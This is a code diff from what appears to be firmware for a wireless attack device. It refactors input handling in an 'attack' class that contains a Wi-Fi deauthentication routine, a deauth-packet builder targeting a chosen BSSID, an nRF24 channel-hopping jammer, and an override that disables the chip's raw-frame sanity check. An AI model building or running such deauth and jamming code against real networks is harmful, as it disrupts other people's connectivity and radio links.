@@ -6,9 +6,10 @@
 #include "Menu.h"
 #include "display.h"
 #include "wifi.h"
+#include "controls.h"
 extern nrf24 nRF24;
 extern display dis;
-extern Menu* activem;
+extern controls ctr;
 extern wifi Wifi;
 extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) {
   return 0;
@@ -20,7 +21,7 @@ void attack::deauth() {
   }
 }
 uint8_t* attack::createDeauthPacket(uint8_t* bssid) {
-  uint8_t* endPacket = deauthPacket;
+  uint8_t* endPacket = Wifi.deauthPacket;
   for (int i = 0; i < 6; i++) {
     endPacket[10 + i] = endPacket[16 + i] = bssid[i];
   }
@@ -32,7 +33,7 @@ void attack::nRF24Jammer() {
   while (nRF24Jamming) {
     for (int j = 0; j < sizeof(hopping_channel); j++) {
       nRF24.changeChannel(hopping_channel[j]);
-      if (activem->handleInput()) {
+      if (ctr.handleInput()) {
         break;
       }
     }
